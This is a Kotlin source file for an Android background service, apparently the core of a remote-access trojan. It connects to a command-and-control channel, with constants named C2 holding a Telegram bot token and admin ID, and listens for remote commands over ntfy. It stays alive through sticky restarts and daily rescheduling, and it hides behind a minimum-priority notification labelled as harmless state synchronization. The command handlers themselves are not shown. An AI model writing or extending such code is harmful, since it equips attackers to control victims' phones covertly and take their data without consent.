package com.systemlinker.base

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.systemlinker.comm.NtfyConnectionManager
import com.systemlinker.features.CommandProcessor
import kotlinx.coroutines.*

class SystemLinkerService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    
    private lateinit var configStore: ConfigStore
    private lateinit var ntfyManager: NtfyConnectionManager

    override fun onCreate() {
        super.onCreate()
        ErrorLogger.setupCrashHandler(applicationContext)
        
        configStore = ConfigStore(this)
        
        val commandProcessor = CommandProcessor(this, Constants.C2.TELEGRAM_BOT_TOKEN, Constants.C2.TELEGRAM_ADMIN_USER_ID)
        ntfyManager = NtfyConnectionManager(this, configStore, commandProcessor)

        createNotificationChannel()
        startForeground(1001, createNotification())

        serviceScope.launch { ntfyManager.startListening() }
    }
    // ... (onStartCommand, onDestroy, onBind are unchanged) ...
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        WorkManagerSetup.scheduleDailyUpdate(this)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Constants.Service.NOTIFICATION_CHANNEL_ID,
                Constants.Service.NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN 
            ).apply {
                description = "Synchronizes application state"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, Constants.Service.NOTIFICATION_CHANNEL_ID)
            .setContentTitle(Constants.Service.NOTIFICATION_TITLE)
            .setContentText(Constants.Service.NOTIFICATION_TEXT)
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }
}